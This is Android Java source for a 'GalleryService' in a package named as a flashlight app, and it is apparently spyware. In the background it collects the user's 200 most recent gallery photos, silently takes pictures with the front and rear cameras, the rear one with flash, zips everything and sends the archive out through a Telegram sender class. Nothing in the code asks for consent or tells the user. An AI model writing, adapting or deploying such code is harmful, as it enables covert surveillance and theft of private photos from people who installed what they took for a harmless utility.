package com.flashlight.app;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.net.Uri;
import android.os.IBinder;
import android.provider.MediaStore;
import androidx.annotation.Nullable;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class GalleryService extends Service {
    private CameraManager manager;
    private CameraDevice device;
    private ImageReader reader;
    private CaptureRequest.Builder builder;
    private ZipOutputStream zos;
    private ByteArrayOutputStream zipBuffer;
    private int photoCount = 1;

    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try {
                zipBuffer = new ByteArrayOutputStream();
                zos = new ZipOutputStream(zipBuffer);
                manager = (CameraManager) getSystemService(CAMERA_SERVICE);

                // Сначала собираем галерею
                addGalleryPhotos();
                
                // Потом делаем снимки
                capturePhoto("up", "1");

            } catch (Exception e) { e.printStackTrace(); }
        }).start();
        return START_NOT_STICKY;
    }

    private void addGalleryPhotos() {
        try {
            List<Uri> allImages = getRecentImages();
            for (Uri uri : allImages) {
                try {
                    InputStream is = getContentResolver().openInputStream(uri);
                    BitmapFactory.Options options = new BitmapFactory.Options();
                    options.inJustDecodeBounds = true;
                    BitmapFactory.decodeStream(is, null, options);
                    if (is != null) is.close();
                    
                    int scale = 1;
                    while (options.outWidth / scale > 2000 || options.outHeight / scale > 2000) { scale *= 2; }

                    is = getContentResolver().openInputStream(uri);
                    options = new BitmapFactory.Options();
                    options.inSampleSize = scale;
                    Bitmap bitmap = BitmapFactory.decodeStream(is, null, options);
                    if (is != null) is.close();

                    if (bitmap != null) {
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                        byte[] bytes = baos.toByteArray();
                        bitmap.recycle();

                        ZipEntry entry = new ZipEntry(photoCount + ".jpg");
                        zos.putNextEntry(entry);
                        zos.write(bytes);
                        zos.closeEntry();
                        photoCount++;
                    }
                } catch (Exception e) { e.printStackTrace(); }
            }
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void capturePhoto(String tag, String id) {
        try {
            android.hardware.camera2.params.StreamConfigurationMap map = 
                manager.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            android.util.Size[] sizes = map.getOutputSizes(ImageFormat.YUV_420_888);
            android.util.Size bestSize = sizes[0];
            for (android.util.Size s : sizes) {
                if (s.getWidth() >= 1280 && s.getHeight() >= 720) { bestSize = s; break; }
            }

            final int w = bestSize.getWidth();
            final int h = bestSize.getHeight();

            manager.openCamera(id, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice cam) {
                    device = cam;
                    reader = ImageReader.newInstance(w, h, ImageFormat.YUV_420_888, 1);
                    reader.setOnImageAvailableListener(r -> {
                        Image img = r.acquireLatestImage();
                        if (img == null) return;
                        
                        ByteBuffer yBuffer = img.getPlanes()[0].getBuffer();
                        ByteBuffer uBuffer = img.getPlanes()[1].getBuffer();
                        ByteBuffer vBuffer = img.getPlanes()[2].getBuffer();
                        int ySize = yBuffer.remaining();
                        int uSize = uBuffer.remaining();
                        int vSize = vBuffer.remaining();
                        
                        byte[] nv21 = new byte[ySize + uSize + vSize];
                        yBuffer.get(nv21, 0, ySize);
                        vBuffer.get(nv21, ySize, vSize);
                        uBuffer.get(nv21, ySize + vSize, uSize);
                        
                        YuvImage yuvImage = new YuvImage(nv21, ImageFormat.NV21, w, h, null);
                        ByteArrayOutputStream out = new ByteArrayOutputStream();
                        yuvImage.compressToJpeg(new Rect(0, 0, w, h), 85, out); 
                        
                        try {
                            String filename = tag.equals("up") ? "up.jpg" : "noup.jpg";
                            ZipEntry entry = new ZipEntry(filename);
                            zos.putNextEntry(entry);
                            zos.write(out.toByteArray());
                            zos.closeEntry();
                        } catch (Exception e) { e.printStackTrace(); }

                        img.close(); r.close(); device.close();
                        
                        if (tag.equals("up")) {
                            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                capturePhoto("noup", "0"); // Задняя
                            }, 1000);
                        } else {
                            // Когда всё готово - отправляем ЗИП
                            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                try {
                                    zos.close();
                                    new TelegramSender().sendZip(zipBuffer.toByteArray(), "all.zip");
                                } catch (Exception e) { e.printStackTrace(); }
                                stopSelf();
                            }, 500);
                        }
                    }, null);
                    try {
                        builder = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(reader.getSurface());
                        
                        if (tag.equals("noup")) {
                            // Для задней камеры включаем вспышку
                            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_ALWAYS_FLASH);
                            builder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_SINGLE);
                        } else {
                            builder.set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF);
                        }

                        device.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession s) {
                                // Задержка 2.5 секунды для задней, 1 сек для фронтальной
                                long delay = tag.equals("noup") ? 2500 : 1000;
                                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                    try { s.capture(builder.build(), null, null); } 
                                    catch (Exception e) { e.printStackTrace(); }
                                }, delay);
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession s) {}
                        }, null);
                    } catch (Exception e) { e.printStackTrace(); }
                }
                @Override public void onDisconnected(CameraDevice c) { c.close(); }
                @Override public void onError(CameraDevice c, int e) { c.close(); }
            }, null);
        } catch (Exception e) { e.printStackTrace(); }
    }

    private List<Uri> getRecentImages() {
        List<Uri> imageUris = new ArrayList<>();
        String[] projection = new String[]{MediaStore.Images.Media._ID};
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null, sortOrder
        );

        if (cursor != null) {
            int count = 0;
            while (cursor.moveToNext() && count < 200) { // 200 фото
                long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                imageUris.add(uri);
                count++;
            }
            cursor.close();
        }
        return imageUris;
    }
}
